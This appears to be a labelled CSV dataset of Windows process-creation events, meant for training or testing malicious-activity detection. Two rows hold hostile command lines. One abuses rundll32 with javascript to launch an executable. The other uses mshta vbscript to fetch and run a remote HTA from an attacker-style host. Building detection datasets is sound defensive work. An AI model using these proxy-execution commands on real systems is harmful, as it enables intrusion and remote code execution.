UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label
2024-07-05T12:39:51.941Z,{C21A9775-BEBD-4671-8B5C-5069A7DDBC11},36269,C:\Windows\explorer.exe,explorer.exe C:\Users\mjones\Documents,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",51766,CORP\mjones,Medium,0,,,benign
2024-07-02T01:21:47.954Z,{5A676C35-00E5-4EAB-ADF5-70CCB76E8920},4592,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c update304.exe"")",C:\Windows\System32\cmd.exe,cmd.exe,34733,CORP\pchen,Medium,1,T1218.011,Rundll32 JavaScript,malicious
2024-07-05T11:04:23.721Z,{B24B214A-9B34-48B6-A2EC-81E1ACEEC5FB},62729,C:\Windows\System32\wuauclt.exe,wuauclt.exe /detectnow /updatenow,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,44393,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T12:02:17.230Z,{73F97E1F-BDC5-46D3-850A-235DBBBAE94D},36232,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-EventLog -LogName System -Newest 50""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,19918,CORP\admin,High,0,,,benign
2024-07-03T12:48:52.500Z,{C9BA82CC-034F-4665-91F6-3BAC5234A6F7},64341,C:\Windows\System32\cmd.exe,cmd.exe /c type C:\Windows\System32\drivers\etc\hosts,C:\Windows\explorer.exe,C:\Windows\explorer.exe,48419,CORP\dbadmin,Medium,0,,,benign
2024-07-04T08:35:26.991Z,{BADD0BE9-373E-43BB-A1B3-BEBF5B6CCB04},28296,C:\Windows\System32\cmd.exe,cmd.exe /c netstat -an,C:\Windows\explorer.exe,C:\Windows\explorer.exe,37522,CORP\itops,High,0,,,benign
2024-07-02T01:45:31.626Z,{85083010-A14E-4C33-89B9-4A8A184B5E5F},63278,C:\Windows\System32\mshta.exe,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"http://stager2089.xyz/script147.hta"""""")",C:\Windows\System32\cmd.exe,explorer.exe,6768,CORP\klee,Medium,1,T1218.005,Mshta Remote HTA,malicious
2024-07-03T17:23:48.147Z,{BC99AF98-89E3-41F0-81E6-66C707C0F36F},14045,C:\Windows\System32\SearchIndexer.exe,C:\Windows\System32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,40483,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-02T14:59:04.306Z,{A9F78708-BABF-4A65-BC64-A9A7CA91B81B},11646,C:\Windows\System32\cmd.exe,cmd.exe /c hostname,C:\Windows\explorer.exe,C:\Windows\explorer.exe,37959,CORP\netadmin,Medium,0,,,benign
2024-07-03T15:15:51.826Z,{78B41D90-8DFA-4AB4-8B42-AA438AB1376E},45891,C:\Windows\System32\taskhostw.exe,taskhostw.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,27613,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
